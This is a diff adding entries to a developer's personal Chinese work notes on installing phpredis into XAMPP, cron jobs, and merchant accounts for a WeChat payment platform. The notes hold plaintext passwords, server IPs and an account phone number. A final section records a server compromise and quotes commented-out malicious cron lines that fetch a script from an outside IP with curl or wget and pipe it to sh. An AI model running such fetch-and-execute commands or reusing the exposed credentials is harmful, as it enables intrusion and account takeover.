@@ -3498,6 +3498,282 @@ http://blog.csdn.net/hel12he/article/details/49781813
 cmd
 php -v 
 
+---------------------------------------
+xampp redis 扩展
+https://www.baidu.com/s?wd=xampp%20redis%20%E6%89%A9%E5%B1%95&rsv_spt=1&rsv_iqid=0x88021f7d00003220&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_sug3=9&rsv_sug1=8&rsv_sug7=101&rsv_t=0030OfQifghEF%2BoNtdXNS%2Bwrbz29GgNTrDEPZfg5uvu7zNePOQLlUQzUqJf0BnV%2FmRiXjA
+
+
+xampp redis 扩展
+https://www.cnblogs.com/lzs-888/p/5386570.html
+
+windows XAMPP环境下安装phpredis扩展
+https://segmentfault.com/a/1190000004619626
+
+
+
+执行php
+/opt/lampp/bin/php -v
+
+47.93.224.195上的xampp php的版本
+
+[root@iZ2ze6brl5j5ankwx6i7lzZ ~]# /opt/lampp/bin/php -v
+PHP 5.5.24 (cli) (built: Apr 20 2015 19:39:09) 
+Copyright (c) 1997-2015 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2015 Zend Technologies
+You have new mail in /var/spool/mail/root
+
+47.93.11.60  处理60服务器上的
+/opt/lampp/bin/php -v
+
+PHP 5.6.14 (cli) (built: Oct 16 2015 16:34:04) 
+Copyright (c) 1997-2015 The PHP Group
+Zend Engine v2.6.0, Copyright (c) 1998-2015 Zend Technologies
+
+
+linux 查找目录或文件
+https://blog.csdn.net/windone0109/article/details/2817792
+
+查找目录：find /（查找范围） -name '查找关键字' -type d
+查找文件：find /（查找范围） -name 查找关键字 -print
+
+
+找到对应的位置
+[root@iZ2ze1gv1fi5l6qzong042Z ~]# find /opt/lampp -name 'ext'
+/opt/lampp/include/php/ext
+
+进入到位置
+cd /opt/lampp/include/php/ext
+
+查看文件
+cat php.ini
+
+-------------------------------
+基于Linux系统利用XAMPP扩展Redis和Memcache 
+https://blog.csdn.net/wj610671226/article/details/72861329
+
+--------------------
+;extension="ming.so"
+
+;extension="ncurses.so"
+
+;extension="dio.so"
+
+;extension="interbase.so"
+在他下面加
+extension="redis.so"
+-------------------------------------------
+下载的版本
+https://pecl.php.net/package/redis
+4.0.0 	stable 	2018-03-17 	redis-4.0.0.tgz (207.4kB)  DLL
+稳定版
+下载地址
+
+https://pecl.php.net/get/redis-4.0.0.tgz
+
+下载
+wget https://pecl.php.net/get/redis-4.0.0.tgz
+
+
+linux php redis模块安装 lampp安装redis模块  ----很不错,非常好
+http://blog.163.com/bailin_li/blog/static/17449017920121114113713547/
+ 
+进入 /opt/lampp/lib/php/extensions
+
+cd /opt/lampp/lib/php/extensions
+
+wget  https://nodeload.github.com/nicolasff/phpredis/zip/master
+
+unzip phpredis-master.zip
+
+unzip master
+
+cd phpredis-master
+cd phpredis-master
+
+/opt/lampp/bin/phpize
+
+"195正式环境遇到的问题"
+Cannot find autoconf. Please check your autoconf installation and the
+$PHP_AUTOCONF environment variable. Then, rerun this script.
+
+解决方案:
+Cannot find autoconf. Please check your autoconf installation and the $PHP_AUTOCONF environment vari
+https://www.baidu.com/s?wd=Cannot%20find%20autoconf.%20Please%20check%20your%20autoconf%20installation%20and%20the%20%24PHP_A&rsv_spt=1&rsv_iqid=0xc2cff92f0002d781&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=0&rsv_sug3=3&rsv_sug1=2&rsv_sug7=001&rsv_n=2&rsv_t=3f34vOHJUiCXq2rFO9ZptKZHTt0Ca1UnVo7iilZR4OLXQF4R9OqXcoZ%2BOc%2BhdISaHmcvBA&prefixsug=%2526lt%253Bannot%2520find%2520autoconf.%2520Please%2520check%2520your%2520autoconf%2520installation%2520and%2520the%2520%2524PHP_AUTO%2526lt%253BONF%2520environment%2520vari&rsp=0&rsv_sug9=es_0_1&inputT=1122&rsv_sug4=7484&rsv_sug=9
+
+Cannot find autoconf. Please check your autoconf installation and the $PHP_AUTOCONF environment vari
+https://blog.csdn.net/21aspnet/article/details/7471574
+
+更简单的办法   --不行
+# yum install m4
+# yum install autoconf
+
+再执行
+/opt/lampp/bin/phpize
+
+
+phpize 编译安装php扩展的时候出现Cannot find autoconf的解决方法 
+https://blog.csdn.net/lovely_1014/article/details/54096513
+
+
+./configure --with-libdir=/opt/lampp/lib/php/extensions/no-debug-non-zts-20131226 --with-php-config=/opt/lampp/bin/php-config
+
+
+./configure --with-libdir=/opt/lampp/lib/php/extensions/no-debug-non-zts-20121212 --with-php-config=/opt/lampp/bin/php-config
+
+ok195正式环境通过了配置了
+
+正式195位置变了
+find /opt/lampp -name 'configure'
+find / -name 'configure'
+
+sudo make
+
+make install
+
+sudo make && make install
+
+cd /opt/lampp/lib/php/extensions/phpredis-master/modules
+
+sudo cp redis.so ../../
+
+find /opt/lampp -name 'php.ini'
+
+位置
+/opt/lampp/etc/php.ini
+
+195复制出来一份
+sudo cp php.ini php.ini20180404bak
+
+find /opt/lampp -name 'redis.so'
+
+位置
+/opt/lampp/lib/php/extensions/redis.so
+
+备份
+/opt/lampp/etc
+sudo cp php.ini php.ini20180403bak
+
+pwd
+/opt/lampp/etc
+vim php.ini
+
+然后修改php.ini文件
+增加以下行：
+extension="/opt/lampp/lib/php/extensions/redis.so"
+
+/opt/lampp/lampp restart 重启xampp
+
+查看扩展情况
+/opt/lampp/bin/php -m
+
+查看
+
+访问测试
+http://47.93.11.60
+
+
+http://47.93.11.60/redis/testRedis.php
+
+http://47.93.11.60/redis/index.php
+
+
+http://47.93.11.60/redis/phpredis.php
+
+http://47.93.11.60/redis/phpredis1.php
+
+
+正式环境测试
+http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/redis/index.php
+
+http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/redis/phpredis.php
+
+http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/redis/phpredis1.php
+
+
+------------------------------------------------------
+20180403下午
+还是不能用,得按phpredis才能用
+
+Redis 客户端连接
+https://help.aliyun.com/document_detail/43848.html?spm=5176.2020520141.105.d3.63fc6375cXvv1Z
+
+phpredis
+https://www.baidu.com/s?wd=phpredis&rsv_spt=1&rsv_iqid=0xb6ce86370001fb9d&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_n=2&rsv_sug3=1
+
+linux安装redis及phpredis环境配置
+https://www.cnblogs.com/chenchenphp/p/6388169.html?utm_source=itdadao&utm_medium=referral
+
+以上不能连接,说明我装的不好使
+
+
+Linux安装phpredis扩展
+
+https://segmentfault.com/a/1190000009422920
+
+安装的扩展包不对
+用这个链接下
+https://github.com/phpredis/phpredis?spm=a2c4g.11186623.2.13.dbHROF
+
+下载地址
+https://github.com/phpredis/phpredis.git
+
+
+https://github.com/phpredis/phpredis/archive/develop.zip
+
+
+Linux安装phpredis扩展
+https://segmentfault.com/a/1190000009422920
+
+重新来
+下载
+wget https://github.com/phpredis/phpredis/archive/develop.zip
+
+./configure --with-libdir=/opt/lampp/lib/php/extensions/no-debug-non-zts-20131226 --with-php-config=/opt/lampp/bin/php-config
+
+还是不好使呀!!!!
+
+php 连接阿里云redis
+https://www.baidu.com/s?wd=php%20%E8%BF%9E%E6%8E%A5%E9%98%BF%E9%87%8C%E4%BA%91redis&rsf=9&rsp=7&f=1&oq=%E8%BF%9E%E6%8E%A5%E9%98%BF%E9%87%8C%E4%BA%91redis&tn=98012088_5_dg&ie=utf-8&ch=12&rsv_idx=2&rsv_pq=e44d456100071445&rsv_t=3e18npmwKa13DGSc12zolXbVebzi4eixrqv1MkJ6eKEjP7xy3ANEvTC81HJh3c3NMHtaMw&rqlang=cn&rs_src=0&rsv_pq=e44d456100071445&rsv_t=3e18npmwKa13DGSc12zolXbVebzi4eixrqv1MkJ6eKEjP7xy3ANEvTC81HJh3c3NMHtaMw
+
+
+
+阿里云服务器上配置并使用: PHP + Redis + Mysql 从配置到使用
+https://www.cnblogs.com/linguanh/p/5587184.html
+
+
+怎么办?
+找java来试一下,确认一下
+
+把Redis完整的安一遍
+
+查看php扩展
+/opt/lampp/bin/php -m
+
+确定安装上了
+
+公网IP： 47.93.11.60
+弹性公网IP： -
+私有IP： 172.17.171.242
+专有网络： vpc-2zexmmrftzsru6gklue6w
+
+
+Redis连接
+
+公网连接-----连接的问题,通过阿里云的帮助文档连接上了!!!!yes!!!
+
+https://help.aliyun.com/document_detail/43850.html?spm=a2c4g.11186623.6.574.OTA9lg
+
+windowsServer
+172.17.192.0/20
+
+60
+私有IP： 172.17.171.242
+------------------------------------------------------
+
+windows参考
+XAMPP PHP redis 扩展
+
+https://www.cnblogs.com/lzs-888/p/5386570.html
 --------------------------------------------
 百度BAE
 
@@ -4736,6 +5012,7 @@ http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/tes
 
 
 ok成功
+执行php
 /opt/lampp/bin/php /opt/www/weixin_platform/155e7ac5857fb33bb5d9430ef3be1699/test.php
 
 /opt/lampp/bin/php /opt/www/weixin_platform/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/index.php Home/Index/timedTaskPayForMember
@@ -4811,7 +5088,10 @@ gsp
 门店  tan01  -> 888888
 
 
-总公司  zfshlm   -》 888888
+总公司  zfshlm   -》 888888  --> zft112358  -->zft78945@!
+-->7U7hW%
+
+
 分公司  daqing   -》 888888
 商户    tan      -》 888888
 门店    tan01    ->  888888
@@ -4848,6 +5128,40 @@ gjbsh
 gjbsp
 888888
 
+
+20180303
+先看会员列表
+5	关精博
+
+添加肇东分公司
+
+黑龙江肇东分公司
+hljzdfgs
+888888
+
+hljzdfgs	黑龙江肇东分公司	
+
+
+黑龙江肇东关精博商户
+
+hljzdgjbsh
+
+888888
+
+黑龙江肇东关精博商铺
+
+hljzdgjbsp
+
+888888
+
+test20180320
+888888
+
+testsh
+888888
+
+testsp
+888888
 --------------------------------------------------
 20180131
 AppSecret
@@ -5016,6 +5330,18 @@ http://47.93.11.60/abc   -->www.zfshlm.com
 这回转发它
 http://sunhongliang.top.1048.url-test.com/zfshlm/public/index/index/index
 
+----------------------------------------------
+20180409
+请求重定向
+
+(www.zfshlm.com)195上的请求,转发给60服务器上执行
+
+MD5
+
+md5在线解密破解,md5解密加密
+
+http://www.cmd5.com/
+
 
 ---------------------------------------------
 目标要转发他,
@@ -5115,15 +5441,29 @@ gjb2
 gjbsp2
 888888
 
+大庆分公司
+daqing
+888888
 
 正式
 
+至富通商户
 zftsh
 888888
 
 
 zftsp
 888888
+
+
+老大让哈尔滨江北建个分公司，调成商家得90%，分公司2.5%，免单2.4%，红包2%
+
+哈尔滨江北分公司
+
+hrbjbfgs
+
+888888
+
 ---------------------------------------------------------------
 关精博铭句
 我:
@@ -5134,3 +5474,164 @@ zftsp
 
 我:
 不要盲目的相信所谓的"高大上",更不要盲目的崇拜"外来的和尚会念经",因为你不了解所谓的"高大上",不了解"外来的和尚",实践是检验人,事,物的最好标准.
+--------------------------------------------------------------------
+20180223
+
+http://lbs.amap.com/
+
+13936931626
+
+zfjskf123
+
+http://lbs.amap.com/dev/id/choose
+
+---------------------------------------------------------------------
+自同步
+口令
+gjb123456
+
+----------------------------------------------------------
+Path
+
+C:\ProgramData\Oracle\Java\javapath;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;D:\Program Files (x86)\VisualSVN Server\bin;D:\Program Files\TortoiseSVN\bin
+
+
+C:\ProgramData\Oracle\Java\javapath;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;D:\Program Files (x86)\VisualSVN Server\bin;D:\Program Files\TortoiseSVN\bin;JAVA_HOME\bin;JAVA_HOME\lib;JAVA_HOME\lib\tools.jar;JAVA_HOME\lib\dt.jar
+
+----------------------------------------------------
+20180303
+
+北京至富科技有限公司(1400641702)
+【重要】微信支付计划更换服务器证书，请开发人员验证以免影响交易（1/2）
+
+尊敬的微信支付商户：
+
+微信支付HTTPS服务器证书的根证书将于2018-08-23日到期，
+微信支付计划于2018-05-29日更换服务器证书。请通知贵司技术开发人员尽快完成相关验证，
+确保安装新的根证书，以免影响正常交易。详细验证流程可参考指引（http://url.cn/52EYiAE）
+
+
+北京至富科技有限公司(1400641702)
+【重要】微信支付计划更换服务器证书，请开发人员验证以免影响交易（2/2）
+
+服务器证书验证补充说明：
+
+1、与微信支付API直接对接（自行开发、外包开发）通信的商户将受影响；
+2、微信买单商户、微信小店商户、服务商下属特约商户等间接对接微信支付的商户不受影响；
+3、升级验证所需工作仅为纯技术验证，不产生任何费用，无需对现有系统进行代码修改；
+4、微信支付未官方授权任何机构或公司进行技术支持，谨防欺诈；
+5、如有疑问，可发送邮件到微信支付技术支持邮箱（wepayTS@tencent.com）。
+
+微信支付团队??2018年3月20日
+
+https://pay.weixin.qq.com/wiki/doc/api/micropay.php?chapter=23_4
+
+--------------------------------------------
+20180326
+Linux crontab实现按秒执行脚本
+https://www.landui.com/help/show-5943.html
+
+*/1 * * * * curl http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/timedTaskPayForMember
+*/1 * * * * curl http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/timedTaskPayForMember
+
+www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+
+位置
+/root/zfshlmpay.sh
+脚本内容
+vim zfshlmpay.sh
+
+
+#!/bin/bash
+step=1
+for((i=0;i<60;i=(i+step)));do
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+sleep $step
+done
+exit 0
+
+得赋予权限呀
+#赋予权限
+chmod 755 zfshlmpay.sh
+
+监控
+tail -f /var/log/cron
+
+修改
+#!/bin/bash
+step=1
+for((i=0;i<60;i=(i+step)));do
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/num
+sleep $step
+done
+exit 0
+
+
+
+修改
+#!/bin/bash
+step=1
+for((i=0;i<60;i=(i+step)));do
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/insertOrder
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/insertOrder
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/insertOrder
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/insertOrder
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32/Home/Index/insertOrder
+sleep $step
+done
+exit 0
+
+20180327
+一秒一次
+
+http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/insertOrder
+
+http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/insertOrder
+
+
+#!/bin/bash
+step=1
+for((i=0;i<60;i=(i+step)));do
+curl www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/insertOrder
+sleep $step
+done
+exit 0
+
+------------------------------------------------
+原来位置
+C:\Users\Administrator\AppData\Local\Android\Sdk
+
+新位置
+D:\android\Sdk
+---------------------------------------------------
+在线文字识别转换
+http://ocr.wdku.net/
+
+----------------------------------------
+20180406
+服务器被黑,定时器被改
+crontable -e
+
+47.93.224.195
+#*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
+#*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
+*/1 * * * * curl http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/timedTaskPayForMember
+*/1 * * * * /root/zfshlmpay.sh
+
+47.93.11.60
+#*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
+#*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
+
+[root@iZ2ze6brl5j5ankwx6i7lzZ ~]# crontab -l
+#*/5 * * * * curl -fsSL http://165.225.157.157:8000/i.sh | sh
+#*/5 * * * * wget -q -O- http://165.225.157.157:8000/i.sh | sh
+*/1 * * * * curl http://www.zfshlm.com/155e7ac5857fb33bb5d9430ef3be1699/thinkphp32_zfshlm/Home/Index/timedTaskPayForMember
+*/1 * * * * /root/zfshlmpay.sh
+
+
+
+
